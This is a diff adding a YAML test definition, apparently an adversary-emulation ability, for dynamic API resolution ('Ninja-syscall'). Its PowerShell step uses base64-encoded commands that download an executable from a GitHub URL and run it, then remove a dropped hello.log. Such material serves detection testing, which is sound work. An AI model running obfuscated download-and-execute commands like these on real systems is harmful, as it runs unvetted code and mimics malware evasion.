@@ -1,0 +1,22 @@
+- id: 45f605a4-0546-5662-9cf3-89194645e238
+  name: Soumaia ART Tests - Dynamic API Resolution-Ninja-syscall
+  description: This test calls NtCreateFile via API hashing and dynamic syscall resolution. I have dubbed this particular combination of techniques 'Ninja-syscall'. When successful, a new file named 'hello.log' will be created in the default user's temporary folder, which is a common location for a dropper. (requires elevation)
+  tactic: stealth
+  technique:
+    attack_id: T1027.007
+    name: 'Obfuscated Files or Information: Dynamic API Resolution'
+  platforms:
+    windows:
+      psh:
+        command: |-
+          powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIALgBcAG4AaQBuAGoAYQBfAHMAeQBzAGMAYQBsAGwAMQAuAGUAeABlACIAKQAgAHsAZQB4AGkAdAAgADAAfQAgAGUAbABzAGUAIAB7AGUAeABpAHQAIAAxAH0ACgA=
+          if ($LASTEXITCODE -ne 0) {
+              powershell -NoProfile -EncodedCommand TgBlAHcALQBJAHQAZQBtACAALQBUAHkAcABlACAARABpAHIAZQBjAHQAbwByAHkAIAAoAHMAcABsAGkAdAAtAHAAYQB0AGgAIAAiAC4AXABuAGkAbgBqAGEAXwBzAHkAcwBjAGEAbABsADEALgBlAHgAZQAiACkAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAGkAZwBuAG8AcgBlACAAfAAgAE8AdQB0AC0ATgB1AGwAbAAKAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwByAGUAZABjAGEAbgBhAHIAeQBjAG8ALwBhAHQAbwBtAGkAYwAtAHIAZQBkAC0AdABlAGEAbQAvAHIAYQB3AC8AbQBhAHMAdABlAHIALwBhAHQAbwBtAGkAYwBzAC8AVAAxADAAMgA3AC4AMAAwADcALwBiAGkAbgAvAG4AaQBuAGoAYQBfAHMAeQBzAGMAYQBsAGwAMQAuAGUAeABlACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAC4AXABuAGkAbgBqAGEAXwBzAHkAcwBjAGEAbABsADEALgBlAHgAZQAiAAoA
+          }
+          Start-Process ".\ninja_syscall1.exe"
+          Start-Sleep -Seconds 7
+          if (Test-Path "C:\Users\Default\AppData\Local\Temp\hello.log") { Remove-Item "C:\Users\Default\AppData\Local\Temp\hello.log" -Force; Write-Host "[+] hello.log removed." }
+        cleanup: |-
+          if (Test-Path "C:\Users\Default\AppData\Local\Temp\hello.log") { Remove-Item "C:\Users\Default\AppData\Local\Temp\hello.log" -Force; Write-Host "[+] hello.log removed." }
+        payloads:
+        - ninja_syscall1.exe
